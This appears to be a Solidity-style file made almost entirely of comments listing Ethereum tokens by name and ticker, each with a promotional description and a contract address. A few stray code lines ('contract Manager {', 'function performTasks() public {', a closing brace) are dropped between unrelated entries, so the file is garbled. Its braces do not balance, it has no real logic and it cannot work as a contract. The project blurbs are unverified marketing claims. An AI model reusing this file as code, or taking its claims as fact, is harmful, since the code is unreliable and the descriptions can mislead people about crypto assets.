// Virtue Poker is a decentralized platform that uses the Ethereum blockchain and P2P networking to provide safe and secure online poker. Virtue Poker also launched Virtue Gaming: a free-to-play play-to-earn platform that is combined with Virtue Poker creating the first legal global player pool.
// 0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e
	

// Edgeless (EDG)
// The Ethereum smart contract-based that offers a 0% house edge and solves the transparency question once and for all.
// 0x08711d3b02c8758f2fb3ab4e80228418a7f8e39c


// Blockchain Certified Data Token (BCDT)
// The Blockchain Certified Data Token is the fuel of the EvidenZ ecosystem, a blockchain-powered certification technology.
// 0xacfa209fb73bf3dd5bbfb1101b9bc999c49062a5


// Airbloc (ABL)
// AIRBLOC is a decentralized personal data protocol where individuals would be able to monetize their data, and advertisers would be able to buy these data to conduct targeted marketing campaigns for higher ROIs.
// 0xf8b358b3397a8ea5464f8cc753645d42e14b79ea

// DAEX Token (DAX)
// DAEX is an open and decentralized clearing and settlement ecosystem for all cryptocurrency exchanges.
// 0x0b4bdc478791897274652dc15ef5c135cae61e60

// Armor (ARMOR)
// Armor is a smart insurance aggregator for DeFi, built on trustless and decentralized financial infrastructure.
// 0x1337def16f9b486faed0293eb623dc8395dfe46a
	

// Spendcoin (SPND)
// Spendcoin powers the Spend.com ecosystem. The Spend Wallet App & Spend Card give our users a multi-currency digital wallet that they can manage or spend from
// 0xddd460bbd9f79847ea08681563e8a9696867210c
	

// Float Protocol: FLOAT (FLOAT)
// FLOAT is a token that is designed to act as a floating stable currency in the protocol.
// 0xb05097849bca421a3f51b249ba6cca4af4b97cb9


// Public Mint (MINT)
// Public Mint offers a fiat-native blockchain platform open for anyone to build fiat-native applications and accept credit cards, ACH, stablecoins, wire transfers and more.
// 0x0cdf9acd87e940837ff21bb40c9fd55f68bba059


// Internxt (INXT)
// Internxt is working on building a private Internet. Internxt Drive is a decentralized cloud storage service available for individuals and businesses.
// 0x4a8f5f96d5436e43112c2fbc6a9f70da9e4e16d4


// Vader (VADER)
// Swap, LP, borrow, lend, mint interest-bearing synths, and more, in a fairly distributed, governance-minimal protocol built to last.
// 0x2602278ee1882889b946eb11dc0e810075650983


// Launchpool token (LPOOL)
// Launchpool believes investment funds and communities work side by side on projects, on the same terms, towards the same goals. Launchpool aims to harness their strengths and aligns their incentives, the sum is greater than its constituent parts.
// 0x6149c26cd2f7b5ccdb32029af817123f6e37df5b


// Unido (UDO)
// Unido is a technology ecosystem that addresses the governance, security and accessibility challenges of decentralized applications - enabling enterprises to manage crypto assets and capitalize on DeFi.
// 0xea3983fc6d0fbbc41fb6f6091f68f3e08894dc06


// YOU Chain (YOU)
// YOUChain will create a public infrastructure chain that all people can participate, produce personal virtual items and trade personal virtual items on their own.
// 0x34364BEe11607b1963d66BCA665FDE93fCA666a8


// RUFF (RUFF)
// Decentralized open source blockchain architecture for high efficiency Internet of Things application development
// 0xf278c1ca969095ffddded020290cf8b5c424ace2



// OddzToken (ODDZ)
// Oddz Protocol is an On-Chain Option trading platform that expedites the execution of options contracts, conditional trades, and futures. It allows the creation, maintenance, execution, and settlement of trustless options, conditional tokens, and futures in a fast, secure, and flexible manner.
// 0xcd2828fc4d8e8a0ede91bb38cf64b1a81de65bf6


// DIGITAL FITNESS (DEFIT)
// Digital Fitness is a groundbreaking decentralised fitness platform powered by its native token DEFIT connecting people with Health and Fitness professionals worldwide. Pioneer in gamification of the Fitness industry with loyalty rewards and challenges for competing and staying fit and healthy.
// 0x84cffa78b2fbbeec8c37391d2b12a04d2030845e


// UCOT (UCT)
// Ubique Chain Of Things (UCT) is utility token and operates on its own platform which combines IOT and blockchain technologies in supply chain industries.
// 0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518

// VIN (VIN)
// Complete vehicle data all in one marketplace - making automotive more secure, transparent and accessible by all
// 0xf3e014fe81267870624132ef3a646b8e83853a96

// Aurora (AOA)
// Aurora Chain offers intelligent application isolation and enables multi-chain parallel expansion to create an extremely high TPS with security maintain.
// 0x9ab165d795019b6d8b3e971dda91071421305e5a


// Egretia (EGT)
// HTML5 Blockchain Engine and Platform
// 0x8e1b448ec7adfc7fa35fc2e885678bd323176e34


// Standard (STND)
// Standard Protocol is a Collateralized Rebasable Stablecoins (CRS) protocol for synthetic assets that will operate in the Polkadot ecosystem
// 0x9040e237c3bf18347bb00957dc22167d0f2b999d


// TrueFlip (TFL)
// Blockchain games with instant payouts and open source code,
// 0xa7f976c360ebbed4465c2855684d1aae5271efa9


// Strips Token (STRP)
// Strips makes it easy for traders and investors to trade interest rates using a derivatives instrument called a perpetual interest rate swap (perpetual IRS). Strips is a decentralised interest rate derivatives exchange built on the Ethereum layer 2 Arbitrum.
// 0x97872eafd79940c7b24f7bcc1eadb1457347adc9


// Decentr (DEC)
// Decentr is a publicly accessible, open-source blockchain protocol that targets the consumer crypto loans market, securing user data, and returning data value to the user.
// 0x30f271C9E86D2B7d00a6376Cd96A1cFBD5F0b9b3


// Jigstack (STAK)
// Jigstack is an Ethereum-based DAO with a conglomerate structure. Its purpose is to govern a range of high-quality DeFi products. Additionally, the infrastructure encompasses a single revenue and governance feed, orchestrated via the native $STAK token.
// 0x1f8a626883d7724dbd59ef51cbd4bf1cf2016d13


// CoinUs (CNUS)
// CoinUs is a integrated business platform with focus on individual's value and experience to provide Human-to-Blockchain Interface.
// 0x722f2f3eac7e9597c73a593f7cf3de33fbfc3308


// qiibeeToken (QBX)
// The global standard for loyalty on the blockchain. With qiibee, businesses around the world can run their loyalty programs on the blockchain.
// 0x2467aa6b5a2351416fd4c3def8462d841feeecec


// Digix Gold Token (DGX)
// Gold Backed Tokens
// 0x4f3afec4e5a3f2a6a1a411def7d7dfe50ee057bf


// aXpire (AXPR)
// The aXpire project is comprised of a number of business-to-business (B2B) software platforms as well as business-to-consumer (B2C) applications. As its mission, aXpire is focused on software for businesses that helps them automate outdated tasks, increasing efficiency, and profitability.
// 0xdD0020B1D5Ba47A54E2EB16800D73Beb6546f91A


// SpaceChain (SPC)
// SpaceChain is a community-based space platform that combines space and blockchain technologies to build the world’s first open-source blockchain-based satellite network.
// 0x8069080a922834460c3a092fb2c1510224dc066b


// COS (COS)
// One-stop shop for all things crypto: an exchange, an e-wallet which supports a broad variety of tokens, a platform for ICO launches and promotional trading campaigns, a fiat gateway, a market cap widget, and more
// 0x7d3cb11f8c13730c24d01826d8f2005f0e1b348f


// Arcona Distribution Contract (ARCONA)
// Arcona - X Reality Metaverse aims to bring together the virtual and real worlds. The Arcona X Reality environment generate new forms of reality by bringing digital objects into the physical world and bringing physical world objects into the digital world
// 0x0f71b8de197a1c84d31de0f1fa7926c365f052b3



// Posscoin (POSS)
// Posscoin is an innovative payment network and a new kind of money.
// 0x6b193e107a773967bd821bcf8218f3548cfa2503



// Internet Node Token (INT)
// IOT applications
// 0x0b76544f6c413a555f309bf76260d1e02377c02a

// PayPie (PPP)
// PayPie platform brings ultimate trust and transparency to the financial markets by introducing the world’s first risk score algorithm based on business accounting.
// 0xc42209aCcC14029c1012fB5680D95fBd6036E2a0


// Impermax (IMX)
// Impermax is a DeFi ecosystem that enables liquidity providers to leverage their LP tokens.
// 0x7b35ce522cb72e4077baeb96cb923a5529764a00


// 1-UP (1-UP)
// 1up is an NFT powered, 2D gaming platform that aims to decentralize battle-royale style tournaments for the average gamer, allowing them to earn.
// 0xc86817249634ac209bc73fca1712bbd75e37407d


// Centra (CTR)
// Centra PrePaid Cryptocurrency Card
// 0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a


// NFT INDEX (NFTI)
// The NFT Index is a digital asset index designed to track tokens’ performance within the NFT industry. The index is weighted based on the value of each token’s circulating supply.
// 0xe5feeac09d36b18b3fa757e5cf3f8da6b8e27f4c

// Own (CHX)
// Own (formerly Chainium) is a security token blockchain project focused on revolutionising equity markets.
// 0x1460a58096d80a50a2f1f956dda497611fa4f165


// Cindicator (CND)
// Hybrid Intelligence for effective asset management.
// 0xd4c435f5b09f855c3317c8524cb1f586e42795fa


// ASIA COIN (ASIA)
// Asia Coin(ASIA) is the native token of Asia Exchange and aiming to be widely used in Asian markets among diamond-Gold and crypto dealers. AsiaX is now offering crypto trading combined with 260,000+ loose diamonds stock.
// 0xf519381791c03dd7666c142d4e49fd94d3536011
	

// 1World (1WO)
// 1World is first of its kind media token and new generation Adsense. 1WO is used for increasing user engagement by sharing 10% ads revenue with participants and for buying ads.
// 0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23

// Insights Network (INSTAR)
// The Insights Network’s unique combination of blockchain technology, smart contracts, and secure multiparty computation enables the individual to securely own, manage, and monetize their data.
// 0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d
	

// Cryptonovae (YAE)
// Cryptonovae is an all-in-one multi-exchange trading ecosystem to manage digital assets across centralized and decentralized exchanges. It aims to provide a sophisticated trading experience through advanced charting features and trade management.
// 0x4ee438be38f8682abb089f2bfea48851c5e71eaf

// CPChain (CPC)
// CPChain is a new distributed infrastructure for next generation Internet of Things (IoT).
// 0xfAE4Ee59CDd86e3Be9e8b90b53AA866327D7c090


// ZAP TOKEN (ZAP)
// Zap project is a suite of tools for creating smart contract oracles and a marketplace to find and subscribe to existing data feeds that have been oraclized
// 0x6781a0f84c7e9e846dcb84a9a5bd49333067b104


// Genaro X (GNX)
// The Genaro Network is the first Turing-complete public blockchain combining peer-to-peer storage with a sustainable consensus mechanism. Genaro's mixed consensus uses SPoR and PoS, ensuring stronger performance and security.
// 0x6ec8a24cabdc339a06a172f8223ea557055adaa5

// PILLAR (PLR)
// A cryptocurrency and token wallet that aims to become the dashboard for its users' digital life.
// 0xe3818504c1b32bf1557b16c238b2e01fd3149c17


// Falcon (FNT)
// Falcon Project it's a DeFi ecosystem which includes two completely interchangeable blockchains - ERC-20 token on the Ethereum and private Falcon blockchain. Falcon Project offers its users the right to choose what suits them best at the moment: speed and convenience or anonymity and privacy.
// 0xdc5864ede28bd4405aa04d93e05a0531797d9d59


// MATRIX AI Network (MAN)
// Aims to be an open source public intelligent blockchain platform
// 0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d


// Genesis Vision (GVT)
// A platform for the private trust management market, built on Blockchain technology and Smart Contracts.
// 0x103c3A209da59d3E7C4A89307e66521e081CFDF0

// CarLive Chain (IOV)
// CarLive Chain is a vertical application of blockchain technology in the field of vehicle networking. It provides services to 1.3 billion vehicle users worldwide and the trillion-dollar-scale automobile consumer market.
// 0x0e69d0a2bbb30abcb7e5cfea0e4fde19c00a8d47

// Cardstack (CARD)
// The experience layer of the decentralized internet.
// 0x954b890704693af242613edef1b603825afcd708

// ZBToken (ZB)
// Blockchain assets financial service provider.
// 0xbd0793332e9fb844a52a205a233ef27a5b34b927

// Cashaa (CAS)
// We welcome Crypto Businesses! We know crypto-related businesses are underserved by banks. Our goal is to create a hassle-free banking experience for ICO-backed companies, exchanges, wallets, and brokers. Come and discover the world of crypto-friendly banking.
// 0xe8780b48bdb05f928697a5e8155f672ed91462f7

// ArcBlock (ABT)
// An open source protocol that provides an abstract layer for accessing underlying blockchains, enabling your application to work on different blockchains.
// 0xb98d4c97425d9908e66e53a6fdf673acca0be986

// POA ERC20 on Foundation (POA20)
// POA Network is an Ethereum-based platform that offers an open-source framework for smart contracts.
// 0x6758b7d441a9739b98552b373703d8d3d14f9e62

// Rubic (RBC)
// Rubic is a multichain DEX aggregator, with instant & cross-chain swaps for Ethereum, BSC, Polygon, Harmony, Tron & xDai, limit orders, fiat on-ramps, and more. The aim of the project is to deliver a complete one-stop full circle decentralized trading platform.
// 0xa4eed63db85311e22df4473f87ccfc3dadcfa3e3

// BTU Protocol (BTU)
// Decentralized Booking Protocol
// 0xb683d83a532e2cb7dfa5275eed3698436371cc9f

// PAID Network (PAID)
// PAID Network is a business toolkit that encompassing SMART Agreements, escrow, reputation-scoring, dispute arbitration and resolution.
// 0x1614f18fc94f47967a3fbe5ffcd46d4e7da3d787

// SENTinel (SENT)
// A modern VPN backed by blockchain anonymity and security.
// 0xa44e5137293e855b1b7bc7e2c6f8cd796ffcb037

// Smart Advertising Transaction Token (SATT)
// SaTT is a new alternative of Internet Ads. Announcers and publishers meet up in a Dapp which acts as an escrow, get neutral metrics and pay fairly publishers.
// 0xdf49c9f599a0a9049d97cff34d0c30e468987389

// Gelato Network Token (GEL)
// Automated smart contract executions on Ethereum.
// 0x15b7c0c907e4c6b9adaaaabc300c08991d6cea05

// Exeedme (XED)
// Exeedme aims to build a trusted Play2Earn blockchain-powered gaming platform where all gamers can make a living doing what they love the most: Playing videogames.
// 0xee573a945b01b788b9287ce062a0cfc15be9fd86

// Stratos Token (STOS)
// Stratos is a decentralized data architecture that provides scalable, reliable, self-balanced storage, database and computation network and offers a solid foundation for data processing.
// 0x08c32b0726c5684024ea6e141c50ade9690bbdcc

// O3 Swap Token (O3)
// O3 Swap is a cross-chain aggregation protocol that enables free trading of native assets between heterogeneous chains, by deploying 'aggregator + asset cross-chain pool' on different public chains and Layer2, provides users to enable cross-chain transactions with one click.
// 0xee9801669c6138e84bd50deb500827b776777d28

// CACHE Gold (CGT)
// CACHE Gold tokens each represent one gram of pure gold stored in vaults around the world. CACHE Gold tokens are redeemable for delivery of physical gold or can be sold for fiat currency.
// 0xf5238462e7235c7b62811567e63dd17d12c2eaa0

// Sentivate (SNTVT)
// A revolutionary new Internet with a hybrid topology consisting of centralized & decentralized systems. The network is designed to go beyond the capabilities of any solely centralized or decentralized one.
// 0x7865af71cf0b288b4e7f654f4f7851eb46a2b7f8

// TokenClub Token (TCT)
// TokenClub, a blockchain-based cryptocurrency investment service community
// 0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7

// Walton (WTC)
// Value Internet of Things (VIoT) constructs a perfect commercial ecosystem via the integration of the real world and the blockchain.
// 0xb7cb1c96db6b22b0d3d9536e0108d062bd488f74

// Populous (PPT)
// Aims to rebuild invoice financing block by block, for invoice buyers and sellers.
// 0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a

// StakeWise (SWISE)
// StakeWise is a liquid Ethereum staking protocol that tokenizes users' deposits and staking rewards as sETH2 (deposit token) and rETH2 (reward token).
// 0x48c3399719b582dd63eb5aadf12a40b4c3f52fa2

// NFTrade Token (NFTD)
// NFTrade is a cross-chain and blockchain-agnostic NFT platform. They are an aggregator of all NFT marketplaces and host the complete NFT lifecycle, allowing anyone to seamlessly create, buy, sell, swap, farm, and leverage NFTs across different blockchains.
// 0x8e0fe2947752be0d5acf73aae77362daf79cb379

// ZMINE Token (ZMN)
// ZMINE Token will be available for purchasing and exchanging for GPUs and use our mining services.
// 0x554ffc77f4251a9fb3c0e3590a6a205f8d4e067d

// InsurAce (INSUR)
// InsurAce is a decentralized insurance protocol, aiming to provide reliable, robust, and carefree DeFi insurance services to DeFi users, with a low premium and sustainable investment returns.
// 0x544c42fbb96b39b21df61cf322b5edc285ee7429

// IceToken (ICE)
// Popsicle finance is a next-gen cross-chain liquidity provider (LP) yield optimization platform
// 0xf16e81dce15b08f326220742020379b855b87df9

// EligmaToken (ELI)
// Eligma is a cognitive commerce platform aiming to create a user-friendly and safe consumer experience with AI and blockchain technology. One of its features is Elipay, a cryptocurrency transaction system.
// 0xc7c03b8a3fc5719066e185ea616e87b88eba44a3

// PolkaFoundry (PKF)
// PolkaFoundry is a platform for making DeFi dapps on Polkadot ecosystem. It comes with some DeFi-friendly services and intergrates with external ones to facilitate the creation of dapps.
// 0x8b39b70e39aa811b69365398e0aace9bee238aeb

// DaTa eXchange Token (DTX)
// As a decentralized marketplace for IoT sensor data using Blockchain technology, Databroker DAO enables sensor owners to turn generated data into revenue streams.
// 0x765f0c16d1ddc279295c1a7c24b0883f62d33f75

// Raiden (RDN)
// The Raiden Network is an off-chain scaling solution, enabling near-instant, low-fee and scalable payments. It’s complementary to the Ethereum blockchain and works with any ERC20 compatible token.
// 0x255aa6df07540cb5d3d297f0d0d4d84cb52bc8e6

// Oraichain Token (ORAI)
// Oraichain is a data oracle platform that aggregates and connects Artificial Intelligence APIs to smart contracts and regular applications.
// 0x4c11249814f11b9346808179cf06e71ac328c1b5

// Atomic Wallet Token (AWC)
// Immutable. Trustless. Distributed. Multi-asset custody-free Wallet with Atomic Swap exchange and decentralized orderbook. Manage your crypto assets in a way Satoshi would use.
// 0xad22f63404f7305e4713ccbd4f296f34770513f4

// Bread (BRD)
// BRD is the simple and secure bitcoin wallet.
// 0x558ec3152e2eb2174905cd19aea4e34a23de9ad6

// VesperToken (VSP)
// Vesper provides a suite of yield-generating products, focused on accessibility, optimization, and longevity.
// 0x1b40183efb4dd766f11bda7a7c3ad8982e998421

// Hop (HOP)
// Hop is a scalable rollup-to-rollup general token bridge. It allows users to send tokens from one rollup or sidechain to another almost immediately without having to wait for the networks challenge period.
// 0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc

// ProBit Token (PROB)
// Global and secure marketplace for digital assets.
// 0xfb559ce67ff522ec0b9ba7f5dc9dc7ef6c139803

// Symbiosis (SIS)
// Symbiosis Finance is a multi-chain liquidity protocol that aggregates exchange liquidity. The SIS token is used as a governance token of Symbiosis DAO and Treasury. Relayers network nodes have to stake SIS to participate in consensus and process swaps.
// 0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9

// QunQunCommunities (QUN)
// Incentive community platform based on blockchain technology.
// 0x264dc2dedcdcbb897561a57cba5085ca416fb7b4

// Polkamon (PMON)
// Collect Ultra-Rare Digital Monsters - Grab $PMON & experience the thrill of unveiling ultra-rare digital monsters only you can truly own!
// 0x1796ae0b0fa4862485106a0de9b654efe301d0b2

// BLOCKv (VEE)
// Create and Public Digital virtual goods on the blockchain
// 0x340d2bde5eb28c1eed91b2f790723e3b160613b7

// UnFederalReserveToken (eRSDL)
// unFederalReserve is a banking SaaS company built on blockchain technology. Our banking products are designed for smaller U.S. Treasury chartered banks and non-bank lenders in need of greater liquidity without sacrificing security or compliance.
// 0x5218E472cFCFE0b64A064F055B43b4cdC9EfD3A6

// Block-Chain.com Token (BC)
// Block-chain.com is the guide to the world of blockchain and cryptocurrency.
// 0x2ecb13a8c458c379c4d9a7259e202de03c8f3d19

// Poolz Finance (POOLZ)
contract Manager {
// Poolz is a decentralized swapping protocol for cross-chain token pools, auctions, as well as OTC deals. The core code is optimized for DAO ecosystems, enabling startups and project owners to bootstrap liquidity before listing.
// 0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23

// Hegic (HEGIC)
// Hegic is an on-chain peer-to-pool options trading protocol built on Ethereum.
// 0x584bC13c7D411c00c01A62e8019472dE68768430

// Pendle (PENDLE)
// Pendle is essentially a protocol for tokenizing yield and an AMM for trading tokenized yield and other time-decaying assets.
// 0x808507121b80c02388fad14726482e061b8da827

// Amber (AMB)
// Combining high-tech sensors, blockchain protocol and smart contracts, we are building a universally verifiable, community-driven ecosystem to assure the quality, safety & origins of products.
// 0x4dc3643dbc642b72c158e7f3d2ff232df61cb6ce

// nDEX (NDX)
// nDEX Network is a next generation decentralized ethereum token exchange. Our primary goal is to provide a clean, fast and secure trading environment with lowest service charge.
// 0x1966d718a565566e8e202792658d7b5ff4ece469

// RED MWAT (MWAT)
// RED-F is a tokenized franchise offer on the European Union energy market, that allows anyone to create and operate their own retail energy business and earn revenues.
// 0x6425c6be902d692ae2db752b3c268afadb099d3b

// Smart MFG (MFG)
// Smart MFG (MFG) is an ERC20 cryptocurrency token issued by Smart MFG for use in supply chain and manufacturing smart contracts. MFG can be used for RFQ (Request for Quote) incentives, securing smart contract POs (Purchase Orders), smart payments, hardware tokenization & NFT marketplace services.
// 0x6710c63432a2de02954fc0f851db07146a6c0312

// dHedge DAO Token (DHT)
// dHEDGE is a decentralized asset management protocol connecting investment managers with investors on the Ethereum blockchain in a permissionless, trustless fashion.
// 0xca1207647Ff814039530D7d35df0e1Dd2e91Fa84

// Geeq (GEEQ)
// Geeq is a multi-blockchain platform secured by our Proof of Honesty protocol (PoH), safe enough for your most valuable data, cheap enough for IoT, and flexible enough for any use.
// 0x6B9f031D718dDed0d681c20cB754F97b3BB81b78

// PCHAIN (PAI)
// Native multichain system in the world that supports Ethereum Virtual Machine (EVM), which consists of one main chain and multiple derived chains.
// 0xb9bb08ab7e9fa0a1356bd4a39ec0ca267e03b0b3

// ChangeNOW (NOW)
// ChangeNow is a fast and easy exchange service that provides simple cryptocurrency swaps without the annoying need to sign up for anything.
// 0xe9a95d175a5f4c9369f3b74222402eb1b837693b

// Offshift (XFT)
// Pioneering #PriFi with the world’s Private Derivatives Platform. 1:1 Collateralization, Zero slippage, Zero liquidations. #zkAssets are here.
// 0xabe580e7ee158da464b51ee1a83ac0289622e6be

// Quantum (QAU)
// Quantum aims to be a deflationary currency.
// 0x671abbe5ce652491985342e85428eb1b07bc6c64

// DAPSTOKEN (DAPS)
// The DAPS project plans to create the world's first fully private blockchain that also maintains the 'Trustless' structure of traditional public blockchains.
// 0x93190dbce9b9bd4aa546270a8d1d65905b5fdd28

// GOVI (GOVI)
// CVI is created by computing a decentralized volatility index from cryptocurrency option prices together with analyzing the market’s expectation of future volatility.
// 0xeeaa40b28a2d1b0b08f6f97bb1dd4b75316c6107

// Fractal Protocol Token (FCL)
// The Fractal Protocol is an open-source protocol designed to rebalance the incentives that make a free and open Web work for all. It builds a new equilibrium that respects user privacy, rewards content creators, and protects advertisers from fraud.
// 0xf4d861575ecc9493420a3f5a14f85b13f0b50eb3

// BHPCash (BHPC)
// Distributed bank based on bitcoin hash power credit, offers innovative service of receiving dividend from mining and multiple derivative financial services on the basis of mining hash power.
// 0xee74110fb5a1007b06282e0de5d73a61bf41d9cd

// Nerve Network (NVT)
// NerveNetwork is a decentralized digital asset service network based on the NULS micro-services framework.
// 0x7b6f71c8b123b38aa8099e0098bec7fbc35b8a13

// Spice (SFI)
// Saffron is an asset collateralization platform where liquidity providers have access to dynamic exposure by selecting customized risk and return profiles.
// 0xb753428af26e81097e7fd17f40c88aaa3e04902c

// GHOST (GHOST)
// GHOST is a Proof of Stake privacy coin to help make you nothing but a 'ghost' when transacting online!
// 0x4c327471C44B2dacD6E90525f9D629bd2e4f662C

// Torum (XTM)
// Torum is a SocialFi ecosystem (Social, NFT,DeFi, Metaverse) that is specially designed to connect cryptocurrency users.
// 0xcd1faff6e578fa5cac469d2418c95671ba1a62fe

// PolkaBridge (PBR)
// PolkaBridge offers a decentralized bridge that connects Polkadot platform and other blockchains.
// 0x298d492e8c1d909d3f63bc4a36c66c64acb3d695

// AurusDeFi (AWX)
// AurusDeFi (AWX) is a revenue-sharing token limited to a total supply of 30 million tokens. AWX entitles its holders to receive 50% of the revenues generated from AurusGOLD (AWG), and 30% from both AurusSILVER (AWS) and AurusPLATINUM (AWP), paid out in AWG, AWS, and AWP.
// 0xa51fc71422a30fa7ffa605b360c3b283501b5bf6

// Darwinia Network Native Token (RING)
// Darwinia Network provides game developers the scalability, cross-chain interoperability, and NFT identifiability, with seamless integrations to Polkadot, bridges to all major blockchains, and on-chain RNG services
// 0x9469d013805bffb7d3debe5e7839237e535ec483

// MCDEX Token (MCB)
// Monte Carlo Decentralized Exchange is a crypto trading platform. MCDEX is powered by the Mai Protocol smart contracts deployed on the Ethereum blockchain. The Mai Protocol smart contracts are fully audited by Open Zeppelin, Consensys, and Chain Security.
// 0x4e352cF164E64ADCBad318C3a1e222E9EBa4Ce42

// SPANK (SPANK)
// A cryptoeconomic powered adult entertainment ecosystem built on the Ethereum network.
// 0x42d6622dece394b54999fbd73d108123806f6a18

// Nebulas (NAS)
// Decentralized Search Framework
// 0x5d65D971895Edc438f465c17DB6992698a52318D

// LAtoken (LA)
// LATOKEN aims to transform access to capital, and enables cryptocurrencies to be widely used in the real economy by making real assets tradable in crypto.
// 0xe50365f5d679cb98a1dd62d6f6e58e59321bcddf

// Tokenomy (TEN)
// Blockchain Project Launchpad & Token Exchange
// 0xdd16ec0f66e54d453e6756713e533355989040e4

// EVAI.IO (EVAI)
// Evai is a decentralised autonomous organisation (DAO) presenting a world-class decentralised ratings platform for crypto, DeFi and NFT-based assets that can be used by anyone to evaluate these new asset classes.
// 0x50f09629d0afdf40398a3f317cc676ca9132055c

// Jarvis Reward Token (JRT)
// Jarvis is a non-custodial financial ecosystem which allows you to manage your assets, from payment to savings, trade any financial markets with any collateral and access any Dapps.
// 0x8a9c67fee641579deba04928c4bc45f66e26343a

// Dentacoin (Dentacoin)
// Aims to be the blockchain solution for the global dental industry.
// 0x08d32b0da63e2C3bcF8019c9c5d849d7a9d791e6

// MetaGraphChain (BKBT)
// Value Discovery Platform of Block Chain & Digital Currencies Based On Meta-graph Chain
// 0x6a27348483d59150ae76ef4c0f3622a78b0ca698

// QuadrantProtocol (eQUAD)
function performTasks() public {
// Quadrant is a blockchain-based protocol that enables the access, creation, and distribution of data products and services with authenticity and provenance at its core.
// 0xc28e931814725bbeb9e670676fabbcb694fe7df2

// BABB BAX (BAX)
// Babb is a financial blockchain platform based in London that aims to bring accessible financial services for the unbanked and under-banked globally.
// 0xf920e4F3FBEF5B3aD0A25017514B769bDc4Ac135

// All Sports Coin (SOC)
// All Sports public blockchain hopes to fill in the blank of blockchain application in sports industry through blockchain technology.
// 0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3

// Deri (DERI)
// Deri is a decentralized protocol for users to exchange risk exposures precisely and capital-efficiently. It is the DeFi way to trade derivatives: to hedge, to speculate, to arbitrage, all on chain.
// 0xa487bf43cf3b10dffc97a9a744cbb7036965d3b9

// BIXToken (BIX)
// A digital asset exchange platform. It aims to stabilize transactions and simplify operations by introducing AI technology to digital asset exchange.
// 0x009c43b42aefac590c719e971020575974122803

// BiFi (BiFi)
// BiFi is a multichain DeFi project powered by Bifrost. BiFi will offer multichain wallet, lending, borrowing, staking services, and other financial investments products.
// 0x2791bfd60d232150bff86b39b7146c0eaaa2ba81

// Covesting (COV)
// Covesting is a fully licensed distributed ledger technology (DLT) services provider incorporated under the laws of Gibraltar. We develop innovative trading tools to service both retail and institutional customers in the cryptocurrency space.
// 0xADA86b1b313D1D5267E3FC0bB303f0A2b66D0Ea7

// VALID (VLD)
// Authenticate online using your self-sovereign eID and start monetizing your anonymized personal data.
// 0x922ac473a3cc241fd3a0049ed14536452d58d73c

// iQeon (IQN)
// decentralized PvP gaming platform integrating games, applications and services based on intelligent competitions between users created to help players monetize their in-gaming achievements.
// 0x0db8d8b76bc361bacbb72e2c491e06085a97ab31

// Mallcoin Token (MLC)
// An international e-commerce site created for users from all over the world, who sell and buy various products and services with tokens.
// 0xc72ed4445b3fe9f0863106e344e241530d338906

// Knoxstertoken (FKX)
// FortKnoxster is a cybersecurity company specializing in safeguarding digital assets. Our innovations, security, and service are extraordinary, and we help secure and futureproof the FinTech and Blockchain space.
// 0x16484d73Ac08d2355F466d448D2b79D2039F6EBB

// DappRadar (RADAR)
// DappRadar aims to be one of the leading global NFT & DeFi DAPP store.
// 0x44709a920fccf795fbc57baa433cc3dd53c44dbe

// KleeKai (KLEE)
// KleeKai was launched as a meme coin, however now sports an addictive game 'KleeRun' a P2E game that is enjoyable for all ages. This token was a fair launch and rewards all holders with a 2% reflection feature that redistributes tokens among the holders every Buy, Swap & Sell.
// 0xA67E9F021B9d208F7e3365B2A155E3C55B27de71

// Six Domain Asset (SDA)
// SixDomainChain (SDChain) is a decentralized public blockchain ecosystem that integrates international standards of IoT Six-Domain Model and reference architecture standards for distributed blockchain.
// 0x4212fea9fec90236ecc51e41e2096b16ceb84555

// TOKPIE (TKP)
// Tokpie is the First Cryptocurrency Exchange with BOUNTY STAKES TRADING. TKP holders can get 500% discount on fees, 70% referral bonus, access to the bounty stakes depositing, regular airdrops and altcoins of promising projects, P2P loans with 90% LTV and income from TKP token staking (lending).
// 0xd31695a1d35e489252ce57b129fd4b1b05e6acac

// Partner (PRC)
// Pipelines valve production.
// 0xcaa05e82bdcba9e25cd1a3bf1afb790c1758943d

// Blockchain Monster Coin (BCMC)
// Blockchain Monster Hunt (BCMH) is the world’s first multi-chain game that runs entirely on the blockchain itself. Inspired by Pokémon-GO, BCMH allows players to continuously explore brand-new places on the blockchain to hunt and battle monsters.
// 0x2BA8349123de45E931a8C8264c332E6e9CF593F9
}
// Free Coin (FREE)
// Social project to promote cryptocurrency usage and increase global wealth
// 0x2f141ce366a2462f02cea3d12cf93e4dca49e4fd

// LikeCoin (LIKE)
// LikeCoin aims to reinvent the Like by realigning creativity and reward. We enable attribution and cross-application collaboration on creative contents
// 0x02f61fd266da6e8b102d4121f5ce7b992640cf98

// IOI Token (IOI)
// QORPO aims to develop a complete ecosystem that cooperates together well, and one thing that ties it all together is IOI Token.
// 0x8b3870df408ff4d7c3a26df852d41034eda11d81

// Pawthereum (PAWTH)
// Pawthereum is a cryptocurrency project with animal welfare charitable fundamentals at its core. It aims to give back to animal shelters and be a digital advocate for animals in need.
// 0xaecc217a749c2405b5ebc9857a16d58bdc1c367f


// Furucombo (COMBO)
// Furucombo is a tool built for end-users to optimize their DeFi strategy simply by drag and drop. It visualizes complex DeFi protocols into cubes. Users setup inputs/outputs and the order of the cubes (a “combo”), then Furucombo bundles all the cubes into one transaction and sends them out.
// 0xffffffff2ba8f66d4e51811c5190992176930278


// Xaurum (Xaurum)
// Xaurum is unit of value on the golden blockchain, it represents an increasing amount of gold and can be exchanged for it by melting
// 0x4DF812F6064def1e5e029f1ca858777CC98D2D81
	

// Plasma (PPAY)
// PPAY is designed as the all-in-one defi service token combining access, rewards, staking and governance functions.
	// 0x054D64b73d3D8A21Af3D764eFd76bCaA774f3Bb2

// Digg (DIGG)
// Digg is an elastic bitcoin-pegged token and governed by BadgerDAO.
// 0x798d1be841a82a273720ce31c822c61a67a601c3


// OriginSport Token (ORS)
// A blockchain based sports betting platform
// 0xeb9a4b185816c354db92db09cc3b50be60b901b6


